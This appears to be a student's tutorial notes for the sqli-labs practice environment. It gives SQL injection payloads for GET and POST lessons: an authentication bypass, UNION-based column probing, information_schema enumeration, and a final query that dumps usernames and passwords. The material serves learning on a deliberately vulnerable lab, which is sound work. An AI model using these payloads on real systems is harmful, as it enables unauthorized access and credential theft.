## SQL Injection Exercises
Based on <https://github.com/Audi-1/sqli-labs>

### Methodology:
1. Identity query vulnerability
2. Identify injection vector
3. Identify number of columns (range) using `ORDER BY`
4. Identify data display positions in the page
5. Retrieve database/version/user information
6. Enumerate tables
7. Enumerate columns
8. Retrieve data

References:
- <https://blog.csdn.net/m0_54899775/article/details/121941275>
- <https://medium.com/@hninja049/step-by-step-sql-injection-ed1bb97b3eae>

## Example 1: GET from sqli-labs

### 1.1. Identify query vulnerability

#### Less-1

- SQL query string: `SELECT * FROM users WHERE id='$id' LIMIT 0,1`
- Test using `?id=1'`: error `''1'' LIMIT 0,1'`

#### Less-2

- SQL query string: `SELECT * FROM users WHERE id=$id LIMIT 0,1`
- Test using `?id=1'`: error `'' LIMIT 0,1'`

#### Less-3

- SQL query string: `SELECT * FROM users WHERE id=('$id') LIMIT 0,1`
- Test using `?id=1'`: error `''1'') LIMIT 0,1'`

#### Less-4

- SQL query string: `SELECT * FROM users WHERE id=($id) LIMIT 0,1`
- Test `?id=1'`: no error, logged in as user ID 1
- Test `?id=1"`: error `'"1"") LIMIT 0,1'`

### 1.2. Identify injection vector (bypass authentication)

```sh
?id=' OR 1=1 -- -
```
> Find the user ID that bypasses authentication and use for subsequent queries

### 1.3. Identify range

```sh
?id=1' OR 1=1 ORDER BY 3 -- -
```

### 1.4. Identify data display positions

```sh
?id=1' UNION SELECT 1,2,3 -- -
```

or

```sh
?id=1' UNION SELECT 1,2,3 LIMIT 1,1 -- -
```

### 1.5. Retrieve database/version/user information

```sh
?id=1' UNION SELECT 1,DATABASE(),3 LIMIT 1,1 -- -
?id=1' UNION SELECT 1,VERSION(),3 LIMIT 1,1 -- -
?id=1' UNION SELECT 1,USER(),3 LIMIT 1,1  -- -
```

### 1.6. Enumerate tables

```sh
?id=1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
```

### 1.7. Enumerate columns

```sh
?id=1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_schema=database() -- -
```

### 1.8. Retrieve data

```sh
?id=1' UNION SELECT 1,GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users -- -
```

## Example 2: POST from sqli-labs

### 2.1. Identify query vulnerability

#### Less-11

- SQL query string: `SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1`
- Test username=`1'`: error `''1'' and password='' LIMIT 0,1'`

#### Less-12

- SQL query string: `SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1`
- Test username=`1'`: no error, login attempt failed
- Test username=`1"`: error `'"1"") and password=("") LIMIT 0,1'`

### 2.2. Identify injection vector (bypass authentication)

```sh
' OR 1=1 -- -
```

> find the user ID that bypasses authentication and use for subsequent queries

### 2.3. Identify range

```sh
' OR 1=1 ORDER BY 2 -- -
```

### 2.4. Identify data display positions

```sh
dumb' UNION SELECT 1,2,3 -- -
```

or

```sh
dumb' UNION SELECT 1,2 LIMIT 1,1 -- -
```

### 2.5. Retrieve database/version/user information

```sh
dumb' UNION SELECT 1,DATABASE() LIMIT 1,1 -- -
dumb' UNION SELECT 1,VERSION() LIMIT 1,1 -- -
dumb' UNION SELECT 1,USER() LIMIT 1,1  -- -
```

### 2.6. Enumerate tables

```sh
dumb' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1 -- -
```

### 2.7. Enumerate columns

```sh
dumb' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 1,1 -- -
```

### 2.8. Retrieve data

```sh
dumb' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users LIMIT 1,1 -- -
```
